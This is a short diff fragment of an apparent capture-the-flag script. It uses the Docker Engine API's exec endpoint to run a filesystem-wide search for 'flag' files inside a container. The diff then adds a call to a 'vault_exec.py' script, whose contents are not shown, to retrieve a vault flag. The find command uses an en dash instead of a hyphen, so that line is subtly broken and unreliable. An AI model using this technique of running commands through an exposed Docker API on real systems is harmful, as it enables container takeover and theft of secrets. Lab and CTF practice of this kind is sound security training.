@@ -86,3 +86,6 @@ def docker_request(method, path, body=None):
 r = docker_request('POST', '/containers/b0b22fe23519/exec', {'AttachStdout':True,'AttachStderr':True,'Cmd':['find','/','–name','flag*']})
 print(r[-500:])
 "
+
+echo "=== VAULT FLAG ==="
+python3 scripts/vault_exec.py
